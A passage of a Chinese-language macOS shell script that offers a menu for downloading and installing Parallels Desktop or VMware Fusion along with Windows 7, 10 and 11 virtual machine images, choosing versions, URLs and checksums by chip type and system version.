    if [ ! -e /Applications/Parallels\ Desktop.app ]; then
    clear && printf "\e[3J"
    echo
	echo	
	echo
	read -s -n1 -p "当前未安装虚拟机软件！！！"
	Virtual
    fi
	zazxt="开"
	zazxtt="1"
	Virtual
	fi	
	;;
	q)
	azqdq="1"
	AZPKG		
	;;
	w)
	azqdq2="1"
	AZPKG		
	;;
	t)
	azqdq3="1"
	AZPKG		
	;;
	h)
	if [ -f $HOME/Desktop/hosts ]; then
	clear && printf "\e[3J"
    echo
	fi
	hfhost="1"
	AZPKG
	;;
	c)
	cqpdfw="1"
	AZPKG
	;;
    1)
    xnjaz="1"
    ybpd="1"
    if [ "$pd1701" ]; then
 	name="ParallelsDesktop-17.0.1-51482.dmg"
 	name2="$name"
	url="https://download.parallels.com/desktop/v17/17.0.1-51482/ParallelsDesktop-17.0.1-51482.dmg"
	AZPKG
    fi
    if [ "$pdbb" = "18" ]; then
	name="ParallelsDesktop-18.0.1-53056.dmg"
	name2="$name"
	url="https://download.parallels.com/desktop/v18/18.0.1-53056/ParallelsDesktop-18.0.1-53056.dmg"
	fi
    if [ "$pdbb" = "17" ]; then
	name="ParallelsDesktop-17.1.2-51548.dmg"
	name2="$name"
	url="https://download.parallels.com/desktop/v17/17.1.2-51548/ParallelsDesktop-17.1.2-51548.dmg"
	fi
	if [ "$pdbb" = "15" ]; then
	name="ParallelsDesktop-15.1.5-47309.dmg"
	name2="$name"
	url="https://download.parallels.com/desktop/v15/15.1.5-47309/ParallelsDesktop-15.1.5-47309.dmg"
	fi
	if [ "$pdbb" = "14" ]; then
	name="ParallelsDesktop-14.1.3-45485.dmg"
	name2="$name"
	url="https://download.parallels.com/desktop/v14/14.1.3-45485/ParallelsDesktop-14.1.3-45485.dmg"
	fi
	if [ "$pdbb" = "13" ]; then
	name="ParallelsDesktop-13.3.2-43368.dmg"
	name2="$name"
	url="https://download.parallels.com/desktop/v13/13.3.2-43368/ParallelsDesktop-13.3.2-43368.dmg"
	fi
	if [ "$pdbb" = "10" ]; then
	name="ParallelsDesktop-10.4.0-29337.dmg"
	name2="$name"
	url="https://download.parallels.com/desktop/v10/10.4.0-29337/ParallelsDesktop-10.4.0-29337.dmg"
	fi
	AZPKG
	;;
	6)
    xnjaz="1"
    if [ "$vmbb" = "13.0.1" ]; then
	name="VMware-Fusion-13.0.1-21139760_universal.dmg"
	url="https://download3.vmware.com/software/FUS-1301/VMware-Fusion-13.0.1-21139760_universal.dmg"
	fi
	if [ "$vmbb" = "12.2.5" ]; then
	name="VMware-Fusion-12.2.5-20904517_x86.dmg"
	url="https://download3.vmware.com/software/FUS-1225/VMware-Fusion-12.2.5-20904517_x86.dmg"
	fi
    if [ "$vmbb" = "12.2.4" ]; then
	name="VMware-Fusion-12.2.4-20071091_x86.dmg"
	url="https://download3.vmware.com/software/FUS-1224/VMware-Fusion-12.2.4-20071091_x86.dmg"
	fi
    if [ "$vmbb" = "12.2.3" ]; then
	name="VMware-Fusion-12.2.3-19436697_x86.dmg"
	url="https://download3.vmware.com/software/FUS-1223-New/VMware-Fusion-12.2.3-19436697_x86.dmg"
	fi
	if [ "$vmbb" = "12.1.2" ]; then
	name="VMware-Fusion-12.1.2-17964953.dmg"
	url="https://download3.vmware.com/software/fusion/file/VMware-Fusion-12.1.2-17964953.dmg"
	fi
	if [ "$vmbb" = "11.5.7" ]; then
	name="VMware-Fusion-11.5.7-17130923.dmg"
	url="https://download3.vmware.com/software/fusion/file/VMware-Fusion-11.5.7-17130923.dmg"
	fi
	if [ "$vmbb" = "11.5.3" ]; then
	name="VMware-Fusion-11.5.3-15870345.dmg"
	url="https://download3.vmware.com/software/fusion/file/VMware-Fusion-11.5.3-15870345.dmg"
	fi
	if [ "$vmbb" = "11.1.1" ]; then
	name="VMware-Fusion-11.1.1-14328561.dmg"
	url="https://download3.vmware.com/software/fusion/file/VMware-Fusion-11.1.1-14328561.dmg"
	fi
	if [ "$vmbb" = "10.1.6" ]; then
	name="VMware-Fusion-10.1.6-12989998.dmg"
	url="https://download3.vmware.com/software/fusion/file/VMware-Fusion-10.1.6-12989998.dmg"
	fi
	if [ "$vmbb" = "8.5.10" ]; then
	name="VMware-Fusion-8.5.10-7527438.dmg"
	url="https://download3.vmware.com/software/fusion/file/VMware-Fusion-8.5.10-7527438.dmg"
	fi
	if [ "$vmbb" = "7.1.2 " ]; then
	name="VMware-Fusion-7.1.2-2779224.dmg"
	url="https://download3.vmware.com/software/fusion/file/VMware-Fusion-7.1.2-2779224.dmg"
	fi
	if [ "$vmbb" = "6.0.4 " ]; then
	name="VMware-Fusion-6.0.4-1887983.dmg"
	url="https://download3.vmware.com/software/fusion/file/VMware-Fusion-6.0.4-1887983.dmg"
	fi
	AZPKG
	;;
	24)
	xnjaz="1"
	azw10="1"
	xnnew10="1"
	pd107z="1"
if [ "$M1Yes" ]; then
name="1113ARM10.7z"
url="$ip8/666/1113ARM10.7z"
SourceMD5="f6d90690475276461cb79125d8fbc79b"
if [ "$zdpdbb" = "18" ]; then
pdbb="18"
name2="ParallelsDesktop-18.0.1-53056.dmg"
url2="$ip8/666/ParallelsDesktop-18.0.1-53056.dmg"
SourceMD52="2688c9d6d5c53e2e86ae8a59ac785f20"
fi
if [ "$zdpdbb" = "17" ]; then
pdbb="17"
name2="ParallelsDesktop-17.1.2-51548.dmg"
url2="$ip8/666/ParallelsDesktop-17.1.2-51548.dmg"
SourceMD52="09fe76a1d3259d5cde1b2d2236648059"
fi
if [ "$zdpdbb" = "16" ]; then
pdbb="16"
name2="ParallelsDesktop-16.5.1-50696.dmg"
url2="$ip8/666/ParallelsDesktop-16.5.1-50696.dmg"
SourceMD52="218199c3d37ce2084c4926f55b5c4585"
fi
AZPKG
fi
name="17Win10.7z"
url="$ip8/666/17Win10.7z"
SourceMD5="f9aa8bae7f48214edb4a2d906238b76d"
if [ "$bigsur" ]; then
if [ "$zdpdbb" = "18" ]; then
pdbb="18"
name2="ParallelsDesktop-18.0.1-53056.dmg"
url2="$ip8/666/ParallelsDesktop-18.0.1-53056.dmg"
SourceMD52="2688c9d6d5c53e2e86ae8a59ac785f20"
fi
if [ "$zdpdbb" = "17" ]; then
pdbb="17"
name2="ParallelsDesktop-17.1.2-51548.dmg"
url2="$ip8/666/ParallelsDesktop-17.1.2-51548.dmg"
SourceMD52="09fe76a1d3259d5cde1b2d2236648059"
fi
if [ "$zdpdbb" = "16" ]; then
pdbb="16"
name2="ParallelsDesktop-16.5.0-49183.dmg"
url2="$ip8/666/ParallelsDesktop-16.5.0-49183.dmg"
SourceMD52="d597839c4739db51a2d1c0247c178cfb"
fi
AZPKG
fi
name2="ParallelsDesktop-17.1.2-51548.dmg"
url2="$ip8/666/ParallelsDesktop-17.1.2-51548.dmg"
SourceMD52="09fe76a1d3259d5cde1b2d2236648059"
if [[ $modelxh = "10.12"* ]]; then
name2="PD14.dmg"
url2="$ip8/666/PD14.dmg"
SourceMD52="d81844bc20a1ab59dedcc0b09fd44c5e"
fi
if [[ $modelxh = "10.11"* ]]; then
name2="PD14.dmg"
url2="$ip8/666/PD14.dmg"
SourceMD52="d81844bc20a1ab59dedcc0b09fd44c5e"
fi
if [[ $modelxh = "10.10"* ]]; then
name2="PD13.dmg"
url2="$ip8/666/PD13.dmg"
SourceMD52="49c61469c67f4e545a8c203c40d693ae"
fi
if [ "$nopd10" ]; then
clear && printf "\e[3J"
echo
echo
read -s -n1 -p "当前系统版本不支持Win10虚拟机..."
Virtual
fi
AZPKG
    ;;
    28)
	xnjaz="1"
	azw11="1"
	xnnew10="1"
if [ "$M1Yes" ]; then
pd107z="1"
name="1113ARM11.7z"
url="$ip8/666/1113ARM11.7z"
SourceMD5="8e33f273dcd5d7b3944b9cd70eeba0c6"
if [ "$zdpdbb" = "18" ]; then
pdbb="18"
name2="ParallelsDesktop-18.0.1-53056.dmg"
url2="$ip8/666/ParallelsDesktop-18.0.1-53056.dmg"
SourceMD52="2688c9d6d5c53e2e86ae8a59ac785f20"
fi
if [ "$zdpdbb" = "17" ]; then
pdbb="17"
name2="ParallelsDesktop-17.1.2-51548.dmg"
url2="$ip8/666/ParallelsDesktop-17.1.2-51548.dmg"
SourceMD52="09fe76a1d3259d5cde1b2d2236648059"
fi
if [ "$zdpdbb" = "16" ]; then
pdbb="16"
name2="ParallelsDesktop-16.5.1-50696.dmg"
url2="$ip8/666/ParallelsDesktop-16.5.1-50696.dmg"
SourceMD52="218199c3d37ce2084c4926f55b5c4585"
fi
AZPKG
fi
if [ "$bigsur" ]; then
pdbb="16"
pd107z="1"
name="16Win11.7z"
url="$ip8/666/16Win11.7z"
SourceMD5="b173c8fe690757a0a397350f06d23a51"
if [ "$zdpdbb" = "18" ]; then
pdbb="18"
name2="ParallelsDesktop-18.0.1-53056.dmg"
url2="$ip8/666/ParallelsDesktop-18.0.1-53056.dmg"
SourceMD52="2688c9d6d5c53e2e86ae8a59ac785f20"
fi
if [ "$zdpdbb" = "17" ]; then
pdbb="17"
name2="ParallelsDesktop-17.1.2-51548.dmg"
url2="$ip8/666/ParallelsDesktop-17.1.2-51548.dmg"
SourceMD52="09fe76a1d3259d5cde1b2d2236648059"
fi
if [ "$zdpdbb" = "16" ]; then
pdbb="16"
name2="ParallelsDesktop-16.5.0-49183.dmg"
url2="$ip8/666/ParallelsDesktop-16.5.0-49183.dmg"
SourceMD52="d597839c4739db51a2d1c0247c178cfb"
fi
AZPKG
fi
if [ "$pddbb" ]; then
pd107z="1"
pdbb="13"
name="16Win11.7z"
url="$ip8/666/16Win11.7z"
name2="PD13.dmg"
url2="$ip8/666/PD13.dmg"
SourceMD5="b173c8fe690757a0a397350f06d23a51"
SourceMD52="49c61469c67f4e545a8c203c40d693ae"
AZPKG
fi
pd107z="1"
pdbb="14"
name="16Win11.7z"
name2="PD14.dmg"
url="$ip8/666/16Win11.7z"
url2="$ip8/666/PD14.dmg"
SourceMD5="b173c8fe690757a0a397350f06d23a51"
SourceMD52="d81844bc20a1ab59dedcc0b09fd44c5e"
AZPKG
    Virtual
    ;;
    29)
	xnjaz="1"
	azw11="1"
	xnnew10="1"
if [ "$M1Yes" ]; then
pdbb="18"
pd107z="1"
name="1122H2.7z"
url="$ip8/666/1122H2.7z"
SourceMD5="bfacce097ee0733ec9c1b66822b4d903"
name2="ParallelsDesktop-18.0.1-53056.dmg"
url2="$ip8/666/ParallelsDesktop-18.0.1-53056.dmg"
SourceMD52="2688c9d6d5c53e2e86ae8a59ac785f20"
AZPKG
fi
    Virtual
    ;;
	2)
	xnjaz="1"
	azw10="1"		
if [ "$M1Yes" ]; then
pd107z="1"
name="628ARM10.7z"
url="$ip8/666/628ARM10.7z"
SourceMD5="5196b345d3c7b96361223ab168aaecc0"
if [ "$zdpdbb" = "18" ]; then
pdbb="18"
name2="ParallelsDesktop-18.0.1-53056.dmg"
url2="$ip8/666/ParallelsDesktop-18.0.1-53056.dmg"
SourceMD52="2688c9d6d5c53e2e86ae8a59ac785f20"
fi
if [ "$zdpdbb" = "17" ]; then
pdbb="17"
name2="ParallelsDesktop-17.1.2-51548.dmg"
url2="$ip8/666/ParallelsDesktop-17.1.2-51548.dmg"
SourceMD52="09fe76a1d3259d5cde1b2d2236648059"
fi
if [ "$zdpdbb" = "16" ]; then
pdbb="16"
name2="ParallelsDesktop-16.5.1-50696.dmg"
url2="$ip8/666/ParallelsDesktop-16.5.1-50696.dmg"
SourceMD52="218199c3d37ce2084c4926f55b5c4585"
fi
AZPKG
fi
if [ "$bigsur" ]; then
pd107z="1"
pdbb="17"
name="16Win10.7z"
url="$ip8/666/16Win10.7z"
SourceMD5="6200cc8392cb84bb06e79bd2be6c12d9"
if [ "$zdpdbb" = "18" ]; then
pdbb="18"
name2="ParallelsDesktop-18.0.1-53056.dmg"
url2="$ip8/666/ParallelsDesktop-18.0.1-53056.dmg"
SourceMD52="2688c9d6d5c53e2e86ae8a59ac785f20"
fi
if [ "$zdpdbb" = "17" ]; then
pdbb="17"
name2="ParallelsDesktop-17.1.2-51548.dmg"
url2="$ip8/666/ParallelsDesktop-17.1.2-51548.dmg"
SourceMD52="09fe76a1d3259d5cde1b2d2236648059"
fi
if [ "$zdpdbb" = "16" ]; then
pdbb="16"
name2="ParallelsDesktop-16.5.0-49183.dmg"
url2="$ip8/666/ParallelsDesktop-16.5.0-49183.dmg"
SourceMD52="d597839c4739db51a2d1c0247c178cfb"
fi
AZPKG
fi
if [ "$nopd10" ]; then
clear && printf "\e[3J"
echo
echo
read -s -n1 -p "当前系统版本不支持Win10虚拟机..."
Virtual
fi
if [ "$pddbb" ]; then
pd107z="1"
pdbb="13"
name="14Win10_911.7z"
url="$ip8/666/14Win10_911.7z"
name2="PD13.dmg"
url2="$ip8/666/PD13.dmg"
SourceMD5="4fd9144d8520ec1e9c5530f1b0c375f8"
SourceMD52="49c61469c67f4e545a8c203c40d693ae"
AZPKG
fi
#if [ "$pd16" ]; then
#pd107z="1"
#pdbb="17"
##name="16Win10.7z"
###name2="PD17.dmg"
####url="$ip8/666/16Win10.7z"
#url2="$ip8/666/PD17.dmg"
#SourceMD5="6200cc8392cb84bb06e79bd2be6c12d9"
#SourceMD52="aeaa48e98d2c2eed9e4d302b2f0ea0d8"
##AZPKG
#fi
pd107z="1"
pdbb="14"
name="14Win10_911.7z"
url="$ip8/666/14Win10_911.7z"
name2="PD14.dmg"
url2="$ip8/666/PD14.dmg"
SourceMD5="4fd9144d8520ec1e9c5530f1b0c375f8"
SourceMD52="d81844bc20a1ab59dedcc0b09fd44c5e"
AZPKG
	;;
	252)
	xnjaz="1"
	azw10="1"
if [ "$M1Yes" ]; then
pdbb="16"
pd107z="1"
name="628ARM10.7z"
url="$ip8/666/628ARM10.7z"
name2="ParallelsDesktop-16.5.1-50696.dmg"
url2="$ip8/666/ParallelsDesktop-16.5.1-50696.dmg"
SourceMD5="5196b345d3c7b96361223ab168aaecc0"
SourceMD52="218199c3d37ce2084c4926f55b5c4585"
rm -rf ~/Downloads/JG_Download/ParallelsDesktop-16.5.2-50703.dmg >/dev/null 2>&1
rm -rf ~/Downloads/JG_Download/ParallelsDesktop-17*.dmg >/dev/null 2>&1
rm -rf ~/Downloads/JG_Download/ParallelsDesktop-18*.dmg >/dev/null 2>&1
AZPKG
else
if [ "$bigsur" ]; then
pdbb="16"
pd107z="1"
name="16Win10.7z"
name2="ParallelsDesktop-16.5.0-49183.dmg"
url="$ip8/666/16Win10.7z"
url2="$ip8/666/ParallelsDesktop-16.5.0-49183.dmg"
SourceMD5="6200cc8392cb84bb06e79bd2be6c12d9"
SourceMD52="d597839c4739db51a2d1c0247c178cfb"
AZPKG
fi
if [ "$nopd10" ]; then
clear && printf "\e[3J"
echo
echo
read -s -n1 -p "当前系统版本不支持Win10虚拟机..."
Virtual
fi
if [ "$pddbb" ]; then
pd107z="1"
pdbb="13"
name="14Win10_911.7z"
name2="PD13.dmg"
url="$ip8/666/14Win10_911.7z"
url2="$ip8/666/PD13.dmg"
SourceMD5="4fd9144d8520ec1e9c5530f1b0c375f8"
SourceMD52="49c61469c67f4e545a8c203c40d693ae"
AZPKG
fi
pd107z="1"
pdbb="14"
name="14Win10_911.7z"
name2="PD14.dmg"
url="$ip8/666/14Win10_911.7z"
url2="$ip8/666/PD14.dmg"
SourceMD5="4fd9144d8520ec1e9c5530f1b0c375f8"
SourceMD52="d81844bc20a1ab59dedcc0b09fd44c5e"
AZPKG
fi
;;
	258)
	xnjaz="1"
	azw11="1"
	azw1125="1"
if [ "$M1Yes" ]; then
pdbb="16"
pd107z="1"
name="A111212.7z"
url="$ip8/666/A111212.7z"
name2="ParallelsDesktop-16.5.1-50696.dmg"
url2="$ip8/666/ParallelsDesktop-16.5.1-50696.dmg"
SourceMD5="47e5a1879ddf051105b9bcf836f7370d"
SourceMD52="218199c3d37ce2084c4926f55b5c4585"
rm -rf ~/Downloads/JG_Download/ParallelsDesktop-16.5.2-50703.dmg >/dev/null 2>&1
rm -rf ~/Downloads/JG_Download/ParallelsDesktop-17*.dmg >/dev/null 2>&1
rm -rf ~/Downloads/JG_Download/ParallelsDesktop-18*.dmg >/dev/null 2>&1
rm -rf ~/Downloads/JG_Download/628ARM11.7z >/dev/null 2>&1
rm -rf ~/Downloads/JG_Download/903ARM11.7z >/dev/null 2>&1
AZPKG
else
if [ "$bigsur" ]; then
pdbb="16"
pd107z="1"
name="16Win11.7z"
name2="ParallelsDesktop-16.5.0-49183.dmg"
url="$ip8/666/16Win11.7z"
url2="$ip8/666/ParallelsDesktop-16.5.0-49183.dmg"
SourceMD5="b173c8fe690757a0a397350f06d23a51"
SourceMD52="d597839c4739db51a2d1c0247c178cfb"
AZPKG
fi
if [ "$nopd10" ]; then
clear && printf "\e[3J"
echo
echo
read -s -n1 -p "当前系统版本不支持Win11虚拟机..."
Virtual
fi
if [ "$pddbb" ]; then
pd107z="1"
pdbb="13"
name="16Win11.7z"
url="$ip8/666/16Win11.7z"
name2="PD13.dmg"
url2="$ip8/666/PD13.dmg"
SourceMD5="b173c8fe690757a0a397350f06d23a51"
SourceMD52="49c61469c67f4e545a8c203c40d693ae"
AZPKG
fi
pd107z="1"
pdbb="14"
name="16Win11.7z"
name2="PD14.dmg"
url="$ip8/666/16Win11.7z"
url2="$ip8/666/PD14.dmg"
SourceMD5="b173c8fe690757a0a397350f06d23a51"
SourceMD52="d81844bc20a1ab59dedcc0b09fd44c5e"
AZPKG
fi
;;
	8)
	xnjaz="1"
	azw11="1"
if [ "$M1Yes" ]; then
pdbb="17"
pd107z="1"
name="A111212.7z"
url="$ip8/666/A111212.7z"
SourceMD5="47e5a1879ddf051105b9bcf836f7370d"
if [ "$zdpdbb" = "18" ]; then
pdbb="18"
name2="ParallelsDesktop-18.0.1-53056.dmg"
url2="$ip8/666/ParallelsDesktop-18.0.1-53056.dmg"
SourceMD52="2688c9d6d5c53e2e86ae8a59ac785f20"
fi
if [ "$zdpdbb" = "17" ]; then
pdbb="17"
name2="ParallelsDesktop-17.1.2-51548.dmg"
url2="$ip8/666/ParallelsDesktop-17.1.2-51548.dmg"
SourceMD52="09fe76a1d3259d5cde1b2d2236648059"
fi
if [ "$zdpdbb" = "16" ]; then
pdbb="16"
name2="ParallelsDesktop-16.5.1-50696.dmg"
url2="$ip8/666/ParallelsDesktop-16.5.1-50696.dmg"
SourceMD52="218199c3d37ce2084c4926f55b5c4585"
fi
AZPKG
else
if [ "$bigsur" ]; then
pdbb="17"
pd107z="1"
name="16Win11.7z"
url="$ip8/666/16Win11.7z"
SourceMD5="b173c8fe690757a0a397350f06d23a51"
if [ "$zdpdbb" = "18" ]; then
pdbb="18"
name2="ParallelsDesktop-18.0.1-53056.dmg"
url2="$ip8/666/ParallelsDesktop-18.0.1-53056.dmg"
SourceMD52="2688c9d6d5c53e2e86ae8a59ac785f20"
fi
if [ "$zdpdbb" = "17" ]; then
pdbb="17"
name2="ParallelsDesktop-17.1.2-51548.dmg"
url2="$ip8/666/ParallelsDesktop-17.1.2-51548.dmg"
SourceMD52="09fe76a1d3259d5cde1b2d2236648059"
fi
if [ "$zdpdbb" = "16" ]; then
pdbb="16"
name2="ParallelsDesktop-16.5.0-49183.dmg"
url2="$ip8/666/ParallelsDesktop-16.5.0-49183.dmg"
SourceMD52="d597839c4739db51a2d1c0247c178cfb"
fi
AZPKG
fi
if [ "$nopd10" ]; then
clear && printf "\e[3J"
echo
echo
read -s -n1 -p "当前系统版本不支持Win11虚拟机..."
Virtual
fi
if [ "$pddbb" ]; then
pd107z="1"
pdbb="13"
name="16Win11.7z"
url="$ip8/666/16Win11.7z"
name2="PD13.dmg"
url2="$ip8/666/PD13.dmg"
SourceMD5="b173c8fe690757a0a397350f06d23a51"
SourceMD52="49c61469c67f4e545a8c203c40d693ae"
AZPKG
fi
pd107z="1"
pdbb="14"
name="16Win11.7z"
url="$ip8/666/16Win11.7z"
name2="PD14.dmg"
url2="$ip8/666/PD14.dmg"
SourceMD5="b173c8fe690757a0a397350f06d23a51"
SourceMD52="d81844bc20a1ab59dedcc0b09fd44c5e"
AZPKG
fi
	;;
	3)
	pd107z="1"
	xnjaz="1"
	azw7="1"
if [ "$M1Yes" ]; then
Virtual
fi	
if [ "$bigsur" ]; then
pdbb="16"
name="16Win7_911.7z"
url="$ip8/666/16Win7_911.7z"
name2="ParallelsDesktop-16.5.0-49183.dmg"
url2="$ip8/666/ParallelsDesktop-16.5.0-49183.dmg"
SourceMD5="fbaf4124343e789be7099a212735b75a"
SourceMD52="d597839c4739db51a2d1c0247c178cfb"
AZPKG
fi
if [ "$pddbb" ]; then
pdbb="10"
name="14Win7_911.7z"
url="$ip8/666/14Win7_911.7z"
name2="PD10.dmg"
url2="$ip8/666/PD10.dmg"
SourceMD5="9ad0e92e54327ecc190b27b9d0e00164"
SourceMD52="eaa977c7dbc548c05c4689b0c5881bd5"
AZPKG
fi
pdbb="14"
name="14Win7_911.7z"
url="$ip8/666/14Win7_911.7z"
name2="PD14.dmg"
url2="$ip8/666/PD14.dmg"
SourceMD5="9ad0e92e54327ecc190b27b9d0e00164"
SourceMD52="d81844bc20a1ab59dedcc0b09fd44c5e"
AZPKG
	;;
	4)
	xnjaz="1"
if [ "$M1Yes" ]; then
	Virtual
	
    m1vm="1"
	name="M1VM_323.dmg"
	name2="VMware-Fusion-e.x.p-19431034_arm64.dmg"
	url="$ip8/666/M1VM_323.dmg"
	url2="$ip8/666/VMware-Fusion-e.x.p-19431034_arm64.dmg"
	AZPKG
fi
    azw10="1"
    pd107z="1"
	name="911v10.7z"
	url="$ip8/666/911v10.7z"
	SourceMD5="23c36790af94fb6a03da226550aae9a2"
	if [ "$vmbb" = "13.0.1" ]; then
	name2="VMware-Fusion-13.0.1-21139760_universal.dmg"
	url2="$ip8/666/VMware-Fusion-13.0.1-21139760_universal.dmg"
	fi
	if [ "$vmbb" = "12.1.2" ]; then
	name2="VMware-Fusion-12.1.2-17964953.dmg"
	url2="$ip8/666/VMware-Fusion-12.1.2-17964953.dmg"
	fi
	if [ "$vmbb" = "11.5.7" ]; then
	name2="VMware-Fusion-11.5.7-17130923.dmg"
	url2="$ip8/666/VMware-Fusion-11.5.7-17130923.dmg"
	fi
	if [ "$vmbb" = "11.5.3" ]; then
	name2="VMware-Fusion-11.5.3-15870345.dmg"
	url2="$ip8/666/VMware-Fusion-11.5.3-15870345.dmg"
	fi
	if [ "$vmbb" = "11.1.1" ]; then
	name2="VMware-Fusion-11.1.1-14328561.dmg"
	url2="$ip8/666/VMware-Fusion-11.1.1-14328561.dmg"
	fi
	if [ "$vmbb" = "10.1.6" ]; then
	name2="VMware-Fusion-10.1.6-12989998.dmg"
	url2="$ip8/666/VMware-Fusion-10.1.6-12989998.dmg"
	fi
	if [ "$vmbb" = "8.5.10" ]; then
	name2="VMware-Fusion-8.5.10-7527438.dmg"
	url2="$ip8/666/VMware-Fusion-8.5.10-7527438.dmg"
	fi
	AZPKG
	;;
	5)
	xnjaz="1"
if [ "$M1Yes" ]; then
Virtual
fi
    azw7="1"
    pd107z="1"
	name="911v7.7z"
	url="$ip8/666/911v7.7z"
	SourceMD5="197a40ef5bd1c0d41dabe5fe98512438"
	if [ "$vmbb" = "13.0.1" ]; then
	name2="VMware-Fusion-13.0.1-21139760_universal.dmg"
	url2="$ip8/666/VMware-Fusion-13.0.1-21139760_universal.dmg"
	fi
	if [ "$vmbb" = "12.1.2" ]; then
	name2="VMware-Fusion-12.1.2-17964953.dmg"
	url2="$ip8/666/VMware-Fusion-12.1.2-17964953.dmg"
	fi
	if [ "$vmbb" = "11.5.7" ]; then
	name2="VMware-Fusion-11.5.7-17130923.dmg"
	url2="$ip8/666/VMware-Fusion-11.5.7-17130923.dmg"
	fi
	if [ "$vmbb" = "11.5.3" ]; then
	name2="VMware-Fusion-11.5.3-15870345.dmg"
	url2="$ip8/666/VMware-Fusion-11.5.3-15870345.dmg"
	fi
	if [ "$vmbb" = "11.1.1" ]; then
	name2="VMware-Fusion-11.1.1-14328561.dmg"
	url2="$ip8/666/VMware-Fusion-11.1.1-14328561.dmg"
	fi
	if [ "$vmbb" = "10.1.6" ]; then
	name2="VMware-Fusion-10.1.6-12989998.dmg"
	url2="$ip8/666/VMware-Fusion-10.1.6-12989998.dmg"
	fi
	if [ "$vmbb" = "8.5.10" ]; then
	name2="VMware-Fusion-8.5.10-7527438.dmg"
	url2="$ip8/666/VMware-Fusion-8.5.10-7527438.dmg"
	fi
	AZPKG
	;;
	m)
clear && printf "\e[3J"	
drvn11="1"
aznum=""
if [ ! "$kqazvm" ]; then 
kqazvmm="关"
else
kqazvmm="开"
fi
echo
echo  "\033[35m[Z]\033[0m 语言：$lang2"	
echo	
echo  "\033[35m[1]\033[0m" Win11-21H2 [ESD]
echo
echo  "\033[35m[2]\033[0m" Win11-22H2 [ESD]
echo
echo  "\033[35m[3]\033[0m" Win11-21H2 [UUP]
echo
echo  "\033[35m[4]\033[0m" Win11-22H2 [UUP]
echo
echo  "\033[35m[5]\033[0m" Win11-23H2 [UUP]
echo
echo
echo  "\033[35m[8]\033[0m" Win10-1903 [ESD]
echo
echo  "\033[35m[9]\033[0m" Win10-22H2 [ESD]
echo
echo  "\033[35m[10]\033[0m" Win10-22H2 [UUP]
echo
echo
echo  "\033[35m[D]\033[0m 切换安装 Parallels Desktop [$zdpdbb]" 
echo
echo  "\033[35m[V]\033[0m 切换安装 VMware Fusion $vmbb [$kqazvmm]"  
echo
echo
echo
read -p "_______请输入选择:" aznum
echo

if [ "$aznum" = "v" ]; then 
if [ ! "$kqazvm" ]; then
kqazvm="1"
zdpdbb="关"
else
kqazvm=""
zdpdbb="18"
fi
Virtual
fi

if [ "$aznum" = "x" ]; then
name=""
aznum=""
drvn11=""
fi

    if [ "$aznum" = "z" ]; then 
	if [ "$lang" = "" ]; then
	lang="tw"
	Virtual
	fi
	if [ "$lang" = "tw" ]; then
	lang="en"
	Virtual
	fi
	if [ "$lang" = "en" ]; then
	lang="jp"
	Virtual
	fi
	if [ "$lang" = "jp" ]; then
	lang="ko"
	Virtual
	fi
	if [ "$lang" = "ko" ]; then
	lang=""
	Virtual
	fi	
    fi

    if [ "$aznum" = "d" ]; then 
	if [ "$zdpdbb" = "关" ]; then
	kqazvm=""	
	zdpdbb="18"
	Virtual
	fi
	if [ "$zdpdbb" = "18" ]; then
	zdpdbb="17"
	Virtual	
	fi
	if [ "$zdpdbb" = "17" ]; then
	zdpdbb="16"
	Virtual	
	fi
	if [ "$zdpdbb" = "16" ]; then
	zdpdbb="18"
	Virtual
	fi
    fi

if [ "$aznum" = "9" ]; then
if [ "$M1Yes" ]; then
clear && printf "\e[3J"
echo
echo
read -s -n1 -p "M芯片此模式已无法使用，请考虑安装Win11"
Virtual
else
if [[ $lang != "" ]]; then
clear && printf "\e[3J"
echo
echo
read -s -n1 -p "其他语言请使用【10】"
Virtual	
fi
xnjaz="1"
isoesd="1"
isoName="22H2Win10E"
SourceSHA1="55ee62e21786e6c4daff875f2fce65db67241f83"
url="http://dl.delivery.mp.microsoft.com/filestreamingservice/files/a6fca105-b105-4b13-b98b-74848e48e3e8/19045.2006.220908-0225.22h2_release_svc_refresh_CLIENTBUSINESS_VOL_x64FRE_zh-cn.esd"
name=${url##*/}
xtname=${url##*/}
fi
fi

if [ "$aznum" = "8" ]; then
if [ "$M1Yes" ]; then
clear && printf "\e[3J"
echo
echo
read -s -n1 -p "M芯片此模式已无法使用，请考虑安装Win11"
Virtual
else
if [[ $lang != "" ]]; then
clear && printf "\e[3J"
echo
echo
read -s -n1 -p "其他语言请使用【10】"
Virtual	
fi
xnjaz="1"
isoesd="1"
isoName="1909Win10E"
SourceSHA1="077b5da46b95ed3420a4b132d083056835a734f5"
url="http://fg.ds.b1.download.windowsupdate.com/d/Upgr/2019/04/18362.30.190401-1528.19h1_release_svc_refresh_clientbusiness_vol_x64fre_zh-cn_077b5da46b95ed3420a4b132d083056835a734f5.esd"
name=${url##*/}
xtname=${url##*/}
fi
fi

if [ "$aznum" = "10" ]; then
if [ "$M1Yes" ]; then
clear && printf "\e[3J"
echo
echo
read -s -n1 -p "M芯片此模式已无法使用，请考虑安装Win11"
Virtual
else
xnjaz="1"
uups="1"
isoName="22H2Win10U"
url3="https://uup.rg-adguard.net/api/GetFiles?id=c7fbaf93-9337-4261-b778-a6e829c07833&lang="$lang3"&edition=professional&txt=yes"
fi
fi


    if [ "$aznum" = "1" ]; then
	xnjaz="1"
	isoesd="1"
	if [ "$M1Yes" ]; then
	isoName="21H2ArmWin11E"
	if [[ $lang = "ko" ]]; then
	SourceSHA1="9dd856191761ac3c2727f65587c40fea1344bf52"
	url="http://dl.delivery.mp.microsoft.com/filestreamingservice/files/c9789e5a-ee33-403f-9b27-d42141566002/22000.318.211104-1236.co_release_svc_refresh_CLIENTBUSINESS_VOL_A64FRE_ko-kr.esd"
	name=${url##*/}
	xtname=${url##*/}
	fi
	if [[ $lang = "jp" ]]; then
	SourceSHA1="f8d2f5b408c9ce7e522763eba215042cb4421a13"
	url="http://dl.delivery.mp.microsoft.com/filestreamingservice/files/58c1e729-b2c6-4e5e-b70b-bdd0bb6afbd1/22000.318.211104-1236.co_release_svc_refresh_CLIENTBUSINESS_VOL_A64FRE_ja-jp.esd"
	name=${url##*/}
	xtname=${url##*/}
	fi
	if [[ $lang = "tw" ]]; then
	SourceSHA1="94c8d0c2e9beef00483e06219ade5b89882e9627"
	url="http://dl.delivery.mp.microsoft.com/filestreamingservice/files/3cb8d2dd-0b1d-43ae-ac23-35261f95fc57/22000.318.211104-1236.co_release_svc_refresh_CLIENTBUSINESS_VOL_A64FRE_zh-tw.esd"
	name=${url##*/}
	xtname=${url##*/}
	fi
	if [[ $lang = "en" ]]; then
